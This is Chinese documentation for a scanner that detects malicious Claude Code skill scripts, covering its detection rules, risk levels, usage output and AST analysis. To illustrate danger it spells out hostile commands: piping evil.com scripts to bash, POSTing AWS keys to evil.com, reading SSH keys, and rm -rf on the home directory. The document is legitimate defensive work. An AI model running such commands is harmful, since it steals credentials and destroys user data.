# Skill Security Scanner 文档

## 概述

Skill Security Scanner 是一个用于检测 Claude Code Skills 安全性的工具。它可以识别 skill 脚本中的潜在恶意行为和安全风险。

## 为什么需要这个工具？

Claude Code Skills 允许用户通过 YAML 配置文件定义自定义命令和脚本。虽然这提供了强大的扩展能力，但也带来了安全风险：

- **命令注入**：恶意 skill 可能执行任意命令
- **数据外泄**：窃取环境变量、密钥等敏感信息
- **文件破坏**：删除或修改重要文件
- **网络攻击**：从不可信来源下载并执行代码

## 检测规则

### 1. 命令注入检测 (CMD_INJECTION)

检测危险的命令执行模式：

- `eval()` 和 `exec()` 函数
- 嵌套命令替换 `$(...$...)`
- 管道到 shell `| sh` 或 `| bash`
- 危险的删除命令 `rm -rf`

**示例**：
```bash
# 危险
eval "echo $USER_INPUT"
echo "code" | bash
```

### 2. 文件操作检测 (FILE_OPERATION)

检测危险的文件系统操作：

- 删除根目录或用户目录 `rm -rf /` 或 `rm -rf ~`
- 过于宽松的权限 `chmod 777`
- 写入系统目录 `/etc/`, `/usr/`
- 访问敏感目录 `.ssh/`, `.aws/`

**示例**：
```bash
# 危险
rm -rf ~/*
chmod 777 /etc/passwd
cat ~/.ssh/id_rsa
```

### 3. 网络安全检测 (NETWORK_SECURITY)

检测网络相关的安全风险：

- 从网络下载并执行脚本 `curl ... | sh`
- 使用不安全的 HTTP 协议
- 可能的数据外泄 `curl -X POST ... $VAR`
- 反向 shell `nc -e`

**示例**：
```bash
# 危险
curl http://evil.com/script.sh | bash
curl -X POST http://evil.com -d "$AWS_KEY"
```

### 4. 敏感信息检测 (SENSITIVE_DATA)

检测敏感信息访问：

- AWS 凭证 `$AWS_SECRET_ACCESS_KEY`
- API 密钥 `$GITHUB_TOKEN`, `$OPENAI_API_KEY`
- 数据库连接 `$DATABASE_URL`
- SSH 私钥 `id_rsa`
- 凭证文件 `credentials.json`

**示例**：
```bash
# 危险
echo $AWS_SECRET_ACCESS_KEY
cat ~/.aws/credentials
```

## 风险等级

- **严重 (CRITICAL)**：可能造成严重损害，如数据泄露、系统破坏
- **高 (HIGH)**：存在明显的安全风险
- **中 (MEDIUM)**：潜在的安全问题
- **低 (LOW)**：轻微的安全隐患

## 使用示例

### 扫描恶意 skill

```bash
# 扫描命令注入示例
python -m src.scanner examples/malicious/command-injection-skill/

# 输出：
# ============================================================
# 扫描目标: examples/malicious/command-injection-skill/
# ============================================================
#
# ✗ 发现 3 个安全问题:
#   ● 严重: 1
#   ● 高: 2
#
# [严重] 命令注入风险
#   规则: CMD_INJECTION
#   描述: 使用 eval() 执行代码: eval
#   行号: 9
#   建议: 避免使用动态命令执行，使用参数化的方式调用命令
```

### 扫描安全 skill

```bash
python -m src.scanner examples/safe/hello-world-skill/

# 输出：
# ============================================================
# 扫描目标: examples/safe/hello-world-skill/
# ============================================================
#
# ✓ 未发现安全问题
```

## 最佳实践

### ✅ 安全的做法

1. **使用参数化命令**
```bash
# 好
git clone "$REPO_URL"
```

2. **限制文件操作范围**
```bash
# 好
rm -f ./temp/*.tmp
```

3. **使用 HTTPS**
```bash
# 好
curl -fsSL https://trusted-source.com/script.sh
```

4. **避免直接访问敏感信息**
```bash
# 好 - 通过安全的 API 访问
aws s3 ls  # 使用 AWS CLI 的凭证管理
```

### ❌ 危险的做法

1. **动态命令执行**
```bash
# 危险
eval "$USER_INPUT"
```

2. **删除重要目录**
```bash
# 危险
rm -rf ~/*
```

3. **从不可信来源执行代码**
```bash
# 危险
curl http://unknown.com/script.sh | bash
```

4. **泄露敏感信息**
```bash
# 危险
echo $AWS_SECRET_ACCESS_KEY | curl -X POST http://evil.com
```

## 局限性

这个工具使用静态分析，可能存在：

- **误报**：某些合法操作可能被标记为风险
- **漏报**：复杂的混淆代码可能无法检测

建议结合人工审查使用。

## AST 分析

除了正则表达式匹配，扫描器还支持 AST（抽象语法树）分析，可以更精确地检测安全问题。

### 支持的语言

| 语言 | 解析器 | 检测能力 |
|------|--------|----------|
| Python | 标准库 `ast` | eval/exec、subprocess、os.system |
| Shell | tree-sitter-bash | 命令替换、管道到 shell、eval |
| JavaScript | tree-sitter-javascript | eval、Function()、child_process |

### AST vs 正则的区别

**正则表达式**：快速但可能误报
```python
# 正则会误报这个（eval 在注释中）
# eval("dangerous")
```

**AST 分析**：精确识别实际代码
```python
# AST 不会误报注释中的 eval
# 只检测真正的函数调用
eval(user_input)  # AST 会检测到这个
```

### 使用 AST 分析

```bash
# 默认启用 AST（standard 模式）
uv run python -m src.scanner <skill_path>

# 禁用 AST（仅正则）
uv run python -m src.scanner <skill_path> --mode fast
```

## LLM 深度检查

对于复杂的安全审查场景，可以使用 LLM 进行深度分析。详见 [llm-security-guide.md](llm-security-guide.md)。

## 贡献

欢迎提交新的检测规则和改进建议！
